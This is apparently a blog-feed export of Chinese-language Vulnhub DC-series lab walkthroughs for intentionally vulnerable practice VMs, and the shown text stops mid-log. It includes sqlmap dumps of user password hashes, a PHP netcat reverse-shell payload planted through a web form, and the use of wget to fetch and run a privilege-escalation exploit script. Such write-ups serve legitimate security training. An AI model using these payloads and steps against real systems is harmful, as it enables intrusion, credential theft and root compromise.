class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.169.235/?nid=3 --batch --level 4 --dbs</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916110452578.png" alt="image-20220916110452578"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.169.235/?nid=3 --batch --level 4 -D d7db --tables</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916110703377.png" alt="image-20220916110703377"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916110737913.png" alt="image-20220916110737913"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.169.235/?nid=3 --batch --level 4 -D d7db -T users --columns</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916111107110.png" alt="image-20220916111107110"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.169.235/?nid=3 -D d7db -T users -C name,pass --dump</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916131250137.png" alt="image-20220916131250137"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |</span><br><span class="line">john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF</span><br></pre></td></tr></table></figure><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916130321651.png" alt="image-20220916130321651"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z </span><br><span class="line">john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john:turtle</span><br></pre></td></tr></table></figure><h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><ul><li>扫目录</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.169.235/ </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.235/user/login/</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916131809216.png" alt="image-20220916131809216"></p><h2 id="写入一句话"><a href="#写入一句话" class="headerlink" title="写入一句话"></a>写入一句话</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916145058925.png" alt="image-20220916145058925"><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916145217367.png" alt="image-20220916145217367"><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916145505547.png" alt="image-20220916145505547"></p><ul><li><p>蚁剑连接</p></li><li><p>无法找到路径 换方案</p></li></ul><hr><h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><ul><li>kali</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916145930590.png" alt="image-20220916145930590"></p><ul><li>老位置写入</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;nc -n 192.168.169.235 6666 -e /bin/bash&quot;);?&gt;</span><br></pre></td></tr></table></figure><ul><li>随便写点东西提交产生交互</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916150241911.png" alt="image-20220916150241911"></p><ul><li>连接成功</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916150315360.png" alt="image-20220916150315360"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><ul><li>翻找可以利用的文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916150434593.png" alt="image-20220916150434593"></p><ul><li>漏洞利用</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916151525458.png" alt="image-20220916151525458"></p><ul><li>下载文件使用命令开始端口让目标机下载</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 807</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916152355711.png" alt="image-20220916152355711"></p><ul><li>下载</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.169.220:807/469961.sh</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916152735992.png" alt="image-20220916152735992"></p><ul><li>加权限 执行</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 46996.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./46996.sh -m netcat</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916155243826.png" alt="image-20220916155243826"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916155423078.png" alt="image-20220916155423078"></p><hr><ul><li>如果报错<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">shell脚本报错/bin/bash^M: bad interpreter: No such file or directory，通过查阅资料得知，shell脚本格式必须是unix才行，但我这个脚本是在windows上编写完成传到Linux服务器上的，所以一执行就报错</span><br><span class="line"></span><br><span class="line">windows环境下的文件是dos格式，即每行结尾以\r\n来标识，而linux下的文件是unix格式，行尾则以\n来标识，查看该文件格式：</span><br><span class="line"></span><br><span class="line">1.cat -A filename，如果输出结果中行末尾是^M， 则 是 d o s 格 式 ， 如 果 行 末 尾 只 是 ，则是dos格式，如果行末尾只是，则是dos格式，如果行末尾只是，则是unix格式。</span><br><span class="line"></span><br><span class="line">2.vim filename，编辑文件，执行“:set ff”,若执行结果为fileformat=dos则为dos格式，若执行结果为fileformat=unix则为unix格式。</span><br><span class="line"></span><br><span class="line">3.od -t x1 filename，以16进制查看文件，若输出结果中存在“0d 0a”则为dos格式，如果只有“0a”则为unix格式。其中“0d”即为回车符“\r”，“0a”即为换行符“\n”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.sed -i “s/\r//” filename 或sed -i “s/^M//” filename，直接将回车符替换为空字符串。</span><br><span class="line"></span><br><span class="line">2.vim filename，编辑文件，执行“: set ff=unix”，将文件设置为unix格式，然后执行“:wq”，保存退出。</span><br><span class="line"></span><br><span class="line">3.dos2unix filename或busybox dos2unix filename，如果提示command not found，可以使用前两种方法。</span><br></pre></td></tr></table></figure></li></ul><hr><p>报错的话</p><p>检查下格式 </p><p>:set ff  若执行结果为fileformat&#x3D;dos则为dos格式</p><p>: set ff&#x3D;unix  将文件设置为unix格式</p><p>然后执行“:wq”，保存退出。</p><hr><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机DC系列-DC7</title>
      <link href="/archives/441a45b4.html"/>
      <url>/archives/441a45b4.html</url>
      
        <content type="html"><![CDATA[<h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><h3 id="About-Release"><a href="#About-Release" class="headerlink" title="About Release"></a>About Release</h3><p><a href="http://www.vulnhub.com/entry/dc-7,356/#top">Back to the Top</a></p><ul><li><strong>Name</strong>: DC: 7</li><li><strong>Date release</strong>: 31 Aug 2019</li><li><strong>Author</strong>: <a href="http://www.vulnhub.com/author/dcau,610/">DCAU</a></li><li><strong>Series</strong>: <a href="http://www.vulnhub.com/series/dc,199/">DC</a></li><li><strong>Web page</strong>: <a href="http://www.five86.com/dc-7.html">http://www.five86.com/dc-7.html</a></li></ul><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>DC-7 是另一个特意建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>虽然这不是一个过于技术性的挑战，但也并不容易。</p><p>虽然这是较早的 DC 版本的一种合乎逻辑的进展（我不会告诉你是哪一个），但其中涉及到一些新概念，但你需要自己弄清楚这些。:-) 如果您需要使用暴力破解或字典攻击，您可能不会成功。</p><p>您需要做的是跳出框框思考。</p><p>Waaaaaay“在盒子外面”。:-)</p><p>这一挑战的最终目标是获得根并阅读唯一的标志。</p><p>必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。</p><p>对于初学者来说，谷歌可以提供很大的帮助，但你可以随时在@DCAU7 上给我发推文，寻求帮助，让你重新开始。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p><h2 id="技术信息"><a href="#技术信息" class="headerlink" title="技术信息"></a>技术信息</h2><p>DC-7 是基于 Debian 64 位构建的 VirtualBox VM，但在大多数 PC 上运行它应该没有任何问题。</p><p>我已经在 VMWare Player 上对此进行了测试，但如果在 VMware 中运行此 VM 有任何问题，请通读<a href="http://www.five86.com/vmware.html">此</a>.</p><p>它当前配置为桥接网络，但是，可以根据您的要求进行更改。网络配置为 DHCP。</p><p>安装很简单 - 下载它，解压缩，然后将它导入 VirtualBox 或 VMWare，然后就可以了。</p><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914122316692.png" alt="image-20220914122316692"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali 192.168.169.220</span><br><span class="line">dc-7 192.168.169.230</span><br></pre></td></tr></table></figure><h2 id="扫描目标ip"><a href="#扫描目标ip" class="headerlink" title="扫描目标ip"></a>扫描目标ip</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914122511348.png" alt="image-20220914122511348"></p><ul><li>http ssh</li></ul><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914122822355.png" alt="image-20220914122822355"></p><ul><li>因为这次提示说暴力破破解不适用,所以要换个思路</li></ul><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914123411399.png" alt="image-20220914123411399"></p><ul><li>百度一下</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Dc7User/staffdb</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914123150278.png" alt="image-20220914123150278"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914123239923.png" alt="image-20220914123239923"></p><h2 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914123601974.png" alt="image-20220914123601974"></p><ul><li>找一些信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;dc7user&quot;;</span><br><span class="line">$password = &quot;MdR3xOgB7#dW&quot;;</span><br><span class="line">$dbname = &quot;Staff&quot;;</span><br><span class="line">$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="ss登录"><a href="#ss登录" class="headerlink" title="ss登录"></a>ss登录</h1><ul><li>根据上面的账号登录</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914123843715.png" alt="image-20220914123843715"></p><ul><li>登陆成功</li></ul><h2 id="backups"><a href="#backups" class="headerlink" title="backups"></a>backups</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914124038799.png" alt="image-20220914124038799"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls一下看见了两个文件 一个backups 一个mobx进入backups文件夹，发现两个文件</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914124201981.png" alt="image-20220914124201981"></p><h2 id="mobx"><a href="#mobx" class="headerlink" title="mobx"></a>mobx</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line">From root@dc-7 Thu Aug 29 17:00:22 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3EPu-0000CV-5C</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3EPu-0000CV-5C@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 17:15:11 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 17:15:11 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3EeF-0000Dx-G1</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 17:15:11 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3EeF-0000Dx-G1@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:15:11 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 17:30:11 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 17:30:11 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3Esl-0000Ec-JQ</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 17:30:11 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3Esl-0000Ec-JQ@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:30:11 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 17:45:11 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 17:45:11 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3F7H-0000G3-Nb</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 17:45:11 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3F7H-0000G3-Nb@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:45:11 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 20:45:21 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 20:45:21 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3Hvd-0000ED-CP</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 20:45:21 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3Hvd-0000ED-CP@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 20:45:21 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 22:45:17 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 22:45:17 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3Jng-0000Iw-Rq</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 22:45:16 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3Jng-0000Iw-Rq@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 22:45:16 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               